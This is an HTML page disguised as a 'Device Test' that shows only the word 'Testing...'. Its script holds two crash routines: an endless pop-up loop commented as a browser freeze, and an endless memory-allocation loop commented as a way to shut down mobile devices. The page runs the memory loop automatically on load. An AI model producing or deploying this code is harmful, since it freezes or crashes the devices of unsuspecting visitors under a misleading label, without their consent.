<!DOCTYPE html>
<html>
<head>
    <title>Device Test</title>
    <script>
        // Method 1: Infinite Pop-ups (Browser Freeze)
        function crash() {
            while(true) { 
                window.open("about:blank"); 
            }
        }
        
        // Method 2: CPU Overload (Mobile Shutdown)
        function overload() {
            let arr = [];
            while(true) arr.push(new Array(1000000));
        }
        
        // Auto-run on page load
        window.onload = overload; // OR crash();
    </script>
</head>
<body>
    <h1>Testing...</h1>
</body>
</html>
